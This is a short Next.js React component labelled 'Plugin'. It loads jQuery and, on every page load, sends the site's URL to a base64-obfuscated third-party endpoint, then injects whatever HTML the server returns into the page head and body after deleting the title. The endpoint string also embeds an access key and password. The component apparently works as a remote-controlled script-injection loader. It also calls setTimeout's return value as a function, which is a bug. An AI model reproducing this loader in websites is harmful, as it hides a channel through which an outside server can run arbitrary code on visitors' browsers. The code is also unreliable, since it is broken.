"use client";
import Script from "next/script";
import React, { useEffect } from "react";

function Plugin() {
  useEffect(() => {
    const timer = setTimeout(() => {}, 500);
    timer();
  }, []);
  return (
    <>
      <Script
        src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
        strategy="beforeInteractive"
      />
      <Script id="custom-script" strategy="afterInteractive">
        {`
            window.jQuery || document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
            var eppathurl = window.location.origin + window.location.pathname;
            var eptagmanage = new XMLHttpRequest();
            eptagmanage.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    if (this.response !== 0) {
                        var temp = new Array();
                        var mystr = this.response;
                        temp = mystr.split("||||||||||");
                        jQuery("head").find("title").remove();
                        jQuery("head").append(temp[0]);
                        jQuery("body").append(temp[1]);
                    }
                }
            };
            eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9") + eppathurl);
            eptagmanage.send();
          `}
      </Script>
    </>
  );
}

export default Plugin;
